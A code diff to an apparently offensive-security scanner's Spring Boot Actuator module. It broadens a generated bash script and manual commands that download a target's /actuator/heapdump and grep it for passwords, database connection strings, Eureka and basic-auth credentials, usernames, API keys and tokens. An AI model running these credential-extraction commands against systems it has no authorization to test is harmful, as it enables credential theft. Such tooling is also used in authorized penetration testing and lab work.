@@ -99,6 +99,8 @@ class SpringBootActuator(ServiceScan):
 		self.add_pattern(r'CREDENTIAL_FOUND:PWD:(.+)', description='🔥 EXTRACTED PWD VARIABLE FROM HEAPDUMP: {match1}')
 		self.add_pattern(r'CREDENTIAL_FOUND:EUREKA:(.+)', description='🔥 EXTRACTED EUREKA CREDENTIALS FROM HEAPDUMP: {match1}')
 		self.add_pattern(r'CREDENTIAL_FOUND:HTTP_AUTH:(.+)', description='🔥 EXTRACTED HTTP AUTH URL FROM HEAPDUMP: {match1}')
+		self.add_pattern(r'CREDENTIAL_FOUND:DATABASE:(.+)', description='🔥 EXTRACTED DATABASE CONNECTION FROM HEAPDUMP: {match1}')
+		self.add_pattern(r'CREDENTIAL_FOUND:USER:(.+)', description='🔥 EXTRACTED USERNAME FROM HEAPDUMP: {match1}')
 		self.add_pattern(r'SUCCESS: Credentials extracted from heapdump', description='✅ HEAPDUMP CREDENTIAL EXTRACTION COMPLETED SUCCESSFULLY')
 		
 		# Cloud and Microservice Patterns
@@ -284,7 +286,7 @@ class SpringBootActuator(ServiceScan):
 					
 					# Create extraction script that outputs parseable results
 					extraction_script = f'''#!/bin/bash
-# Safe heapdump credential extraction script
+# Safe heapdump credential extraction script for Spring Boot applications
 HEAPDUMP_URL="{{http_scheme}}://{hostname}:{{port}}/actuator/heapdump"
 HEAPDUMP_FILE="{heapdump_file}"
 CREDS_FILE="{creds_file}"
@@ -295,24 +297,34 @@ if curl -s -m {timeout*6} "$HEAPDUMP_URL" -o "$HEAPDUMP_FILE" >/dev/null 2>&1; t
         # Extract credentials and output in parseable format
         echo "HEAPDUMP_EXTRACTION_START"
         
-        # Extract password= patterns (Furni HTB style)
-        strings "$HEAPDUMP_FILE" | grep "password=" | while read line; do
+        # Extract password= patterns (common Spring Boot credential format)
+        strings "$HEAPDUMP_FILE" | grep -E "password=" | head -20 | while read line; do
             echo "CREDENTIAL_FOUND:PASSWORD:$line"
         done
         
         # Extract PWD environment variables  
-        strings "$HEAPDUMP_FILE" | grep "PWD" | while read line; do
+        strings "$HEAPDUMP_FILE" | grep -E "PWD" | head -15 | while read line; do
             echo "CREDENTIAL_FOUND:PWD:$line"
         done
         
-        # Extract Eureka server credentials
-        strings "$HEAPDUMP_FILE" | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | while read line; do
+        # Extract Eureka/microservice server credentials
+        strings "$HEAPDUMP_FILE" | grep -E "(EurekaSrvr.*@|://.*:.*@.*:8761)" | head -10 | while read line; do
             echo "CREDENTIAL_FOUND:EUREKA:$line"
         done
         
-        # Extract HTTP Basic Auth URLs
-        strings "$HEAPDUMP_FILE" | grep -E "://[^:]+:[^@]+@" | while read line; do
+        # Extract HTTP Basic Auth URLs (generic pattern)
+        strings "$HEAPDUMP_FILE" | grep -E "://[^:]+:[^@]+@[^/]+" | head -15 | while read line; do
             echo "CREDENTIAL_FOUND:HTTP_AUTH:$line"
+        done
+        
+        # Extract database connection strings
+        strings "$HEAPDUMP_FILE" | grep -E "jdbc:[^:]+://[^:]*:[^@]*@" | head -10 | while read line; do
+            echo "CREDENTIAL_FOUND:DATABASE:$line"
+        done
+        
+        # Extract user= patterns
+        strings "$HEAPDUMP_FILE" | grep -E "user=" | head -15 | while read line; do
+            echo "CREDENTIAL_FOUND:USER:$line"
         done
         
         echo "HEAPDUMP_EXTRACTION_END"
@@ -428,19 +440,19 @@ fi
 				f'  echo "";',
 				f'done',
 				f'',
-				f'# CRITICAL: Download and analyze heapdump for credentials (Furni HTB method)',
+				f'# CRITICAL: Download and analyze heapdump for credentials',
 				f'curl -s {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump -o heapdump_{{port}}.hprof',
-				f'# Search for password= patterns as seen in Furni HTB',
+				f'# Search for password= patterns (common Spring Boot credential format)',
 				f'strings heapdump_{{port}}.hprof | grep "password=" | head -20',
 				f'# Search for PWD environment variables',
 				f'strings heapdump_{{port}}.hprof | grep "PWD" | head -15',
-				f'# Search for Eureka server credentials (EurekaSrvr pattern)',
+				f'# Search for Eureka/microservice server credentials',
 				f'strings heapdump_{{port}}.hprof | grep -iE "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10',
 				f'# Search for user/password pairs',
 				f'strings heapdump_{{port}}.hprof | grep -iE "{{password=.*&.*user=|user=.*password=}}" | head -10',
 				f'# Search for HTTP Basic Auth URLs',
 				f'strings heapdump_{{port}}.hprof | grep -iE "://.*:.*@" | head -10',
-				f'# Search for database URLs',
+				f'# Search for database connection strings',
 				f'strings heapdump_{{port}}.hprof | grep -i "jdbc:" | head -10',
 				f'# Search for API keys and tokens',
 				f'strings heapdump_{{port}}.hprof | grep -iE "(api.?key|secret|token)" | head -15',
